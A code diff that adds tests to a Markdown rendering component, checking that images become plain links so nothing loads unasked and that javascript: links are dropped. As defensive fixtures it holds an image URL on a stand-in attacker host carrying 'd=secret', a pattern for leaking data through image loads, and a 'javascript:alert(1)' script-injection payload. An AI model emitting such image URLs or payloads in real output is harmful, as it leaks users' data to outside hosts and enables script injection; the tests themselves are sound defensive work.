@@ -26,6 +26,25 @@ describe('Markdown', () => {
     expect(container.textContent).toContain('<img src="x"')
   })
 
+  it('turns a Markdown image into a link showing its alt text, so nothing loads unasked', () => {
+    const { container } = render(
+      <Markdown>{'![the diagram](https://evil.example/p.png?d=secret)'}</Markdown>,
+    )
+
+    expect(container.querySelector('img')).toBeNull()
+    const link = screen.getByRole('link', { name: 'the diagram' })
+    expect(link).toHaveAttribute('href', 'https://evil.example/p.png?d=secret')
+    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'))
+    expect(link).toHaveAttribute('target', '_blank')
+  })
+
+  it('shows a fixed label for an image with no alt text', () => {
+    const { container } = render(<Markdown>{'![](https://evil.example/p.png)'}</Markdown>)
+
+    expect(container.querySelector('img')).toBeNull()
+    expect(screen.getByRole('link', { name: 'Image' })).toBeInTheDocument()
+  })
+
   it('drops a javascript: link target', () => {
     render(<Markdown>{'[click](javascript:alert(1))'}</Markdown>)
 
